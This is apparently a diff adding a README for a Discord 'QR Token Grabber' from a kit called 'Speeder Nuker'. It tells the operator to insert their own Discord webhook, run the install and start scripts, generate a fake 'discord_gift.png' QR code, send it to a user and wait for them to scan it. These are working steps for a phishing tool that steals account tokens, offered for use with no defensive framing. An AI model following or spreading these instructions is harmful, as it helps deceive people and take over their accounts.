@@ -1,0 +1,19 @@
+Thanks for using Speeder Nuker
+
+How to run QR Token Grabber
+
+1.Go right click on QR.py edit and replace the url with your discord webhook
+
+2.Run install.bat (To install requirements)
+
+3.It should automatically load the qr token grabber program
+
+4.If it doesn't read automatically, go to start.bat
+
+5.Wait for your discord_gift.png to be generated
+
+6.When it is generated, send it to a user
+
+7.Wait for the user to scan the QR code
+
+8.Enjoy
